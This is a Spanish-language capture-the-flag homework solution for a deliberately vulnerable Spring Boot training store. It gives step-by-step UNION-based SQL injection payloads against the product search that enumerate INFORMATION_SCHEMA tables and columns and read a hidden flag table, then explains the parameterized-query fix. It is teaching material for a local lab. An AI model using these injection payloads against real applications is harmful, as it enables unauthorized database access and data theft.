# Reto CTF · La tabla escondida (tarea para la casa)

**Objetivo:** leer la bandera de una tabla que **ninguna pantalla** de la tienda
muestra, usando la inyección SQL del buscador de productos (M1) de la versión vulnerable.
**Pista para el aula:** la base guarda un catálogo de sus propias tablas, `INFORMATION_SCHEMA`.
**Marcador:** `M1` · `Reto CTF (secreto_ctf)`, `exito` en 3000 y `bloqueado` en 3001.

> H2 no tiene `sqlite_master` (eso es de SQLite); su catálogo estándar es
> `INFORMATION_SCHEMA`.

## Preparación

```powershell
git checkout modulo-0
.\mvnw.cmd spring-boot:run "-Dspring-boot.run.profiles=vulnerable"
```

`modulo-0` es la versión con todo vulnerable. También funciona en la versión
vulnerable actual (puerto 3000), porque el perfil vulnerable nunca se corrige.

## Solución paso a paso

Todo se escribe en el buscador de productos de `http://localhost:3000`, o con
`requests/01-sqli.http` (bloques "Reto CTF").

**1. ¿Cuántas columnas devuelve la búsqueda?** Una comilla sola rompe la consulta y
el error muestra el SQL: `SELECT id, name, description, price FROM products ...`.
Son **4 columnas**; el `UNION` debe tener 4 también.

**2. Listar las tablas de la base:**

```sql
' UNION SELECT 1, TABLE_NAME, '', 0 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC' --
```

Aparecen como "productos": `COMMENTS`, `PRODUCTS`, `USERS` y **`SECRETO_CTF`**.

**3. (Opcional) Ver sus columnas:**

```sql
' UNION SELECT 1, COLUMN_NAME, '', 0 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='SECRETO_CTF' --
```

Devuelve `ID` y `FLAG`.

**4. Leer la bandera:**

```sql
' UNION SELECT id, flag, '', 0 FROM secreto_ctf --
```

Bandera: **`FLAG{union_select_information_schema}`**

## Por qué funciona y cómo se corrige

- El `--` comenta el resto de la consulta original (el `%'` que cierra el `ILIKE`).
- Los payloads no llevan `:` ni `?`, porque Hibernate los interpretaría como
  parámetros dentro de la consulta nativa.
- En 3001 la búsqueda usa `findByNameContainingIgnoreCase` (consulta parametrizada):
  el payload se busca como nombre literal y devuelve `[]`. La corrección es la misma
  de `soluciones/01-sqli.md`.
